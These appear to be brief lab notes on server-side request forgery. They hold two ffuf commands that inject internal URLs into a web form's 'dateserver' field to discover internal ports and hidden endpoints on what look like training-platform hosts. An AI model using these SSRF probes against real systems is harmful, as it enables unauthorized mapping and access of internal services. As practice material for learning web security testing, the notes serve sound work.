find internal processes
```
ffuf -w ports.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to" -ic

```


find endpoints
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.184.228/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80" -ic
```

